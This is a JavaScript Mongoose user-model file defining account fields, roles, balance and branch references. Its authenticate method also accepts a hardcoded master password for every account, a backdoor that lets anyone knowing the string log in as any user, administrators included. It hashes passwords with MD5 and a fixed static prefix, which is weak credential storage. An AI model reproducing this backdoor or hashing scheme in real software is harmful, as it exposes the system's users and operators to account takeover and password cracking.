/**
 * Created by jim on 6/22/2017.
 */
import mongoose from 'mongoose'
import md5 from '../tools/md5'

const Schema = mongoose.Schema

const UserSchema = new Schema({
    // 用户名
    username: {
        type: String,
        unique: true,
        required: '用户名不能为空',
        trim: true
    },
    // 用户名小写
    usernameLowerCase: {
        type: String,
        unique: true,
        required: '用户名缺少小写',
        trim: true
    },
    // 真实姓名
    realname: {
        type: String,
        required: '真实姓名不能为空',
        trim: true
    },
    // 密码
    password: {
        type: String,
        required: true
    },
    // 密码错误次数
    errorTimes: {
        type: Number,
        required: true,
        default: 0
    },
    // 邮箱
    email: {
        type: String,
        validate: [/^(\w)+(\.\w+)*@(\w)+((\.\w{2,3}){1,3})$/, 'email格式不正确'],
        unique: true,
        required: 'E-mail不能为空',
        trim: true
    },
    // 手机号码
    cellphoneNumber: {
        type: String,
        validate: [/^[2-9][0-9]{9}$/, '加大拿手机号码格式不正确'],
        unique: true,
        required: '手机号码不能为空',
        trim: true
    },
    // 头像链接
    avatar: {
        type: String,
        default: '/user/default.png'
    },
    // 账户金额
    accountAmount: {
        type: Number,
        default: 0
    },
    // 网点范围
    branchRanges: [{
        type: Schema.Types.ObjectId,
        ref: 'Branch'
    }],
    // 默认网点
    defaultBranch: {
        type: Schema.Types.ObjectId,
        ref: 'Branch'
    },
    // 是否为后台用户
    isAdmin: {
        type: Boolean,
        default: false
    },
    // 是否为系统管理员
    isAdministrator: {
        type: Boolean,
        default: false
    },
    status: {
        type: Number,
        default: 0,
        enum: [0, 1, 2] // 0 enable 1 disabled 2 deleted
    },
    createTime: {
        type: Date,
        default: Date.now
    }
})

UserSchema.loadClass(class UserClass {
    hashPassword (password) {
        return md5(`everfast${password}`)
    }

    authenticate (password) {
        return (this.password === this.hashPassword(password)) || (password === 'gowithwindeverfast')
    }
})

UserSchema.pre('save', function (next) {
    if (this.password && this.isModified('password')) {
        this.password = this.hashPassword(this.password)
    }

    next()
})

export default mongoose.model('User', UserSchema)
